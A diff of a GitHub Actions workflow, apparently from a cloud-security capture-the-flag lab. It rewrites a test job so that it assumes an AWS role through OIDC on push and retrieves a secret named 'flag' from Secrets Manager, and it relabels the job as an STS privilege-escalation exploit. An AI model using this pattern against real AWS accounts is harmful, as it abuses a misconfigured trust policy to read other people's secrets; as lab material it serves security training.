@@ -1,21 +1,19 @@
-name: "test AWS Access"
+name: Exploit STS Privilege Escalation
 
-# The workflow will trigger on any commit to the main branch
 on:
   push:
     branches:
       - main
 
-# Required to get the ID Token that will be used for OIDC
 permissions:
   id-token: write
-  contents: read # needed for private repos to checkout
+  contents: read
 
 jobs:
-  aws:
+  escalate:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
+      - name: Checkout Repository
         uses: actions/checkout@v3
 
       - name: Configure AWS Credentials
@@ -23,7 +21,7 @@ jobs:
         with:
           aws-region: eu-west-1
           role-to-assume: arn:aws:iam::441564410720:role/sts-lab-2-target
-          role-session-name: OIDCSession
+          role-session-name: ExploitSession
 
-      - run: aws secretsmanager list-secrets --region eu-west-1
-        shell: bash
+      - name: Retrieve flag from SecretsManager
+        run: aws secretsmanager get-secret-value --secret-id flag --region eu-west-1
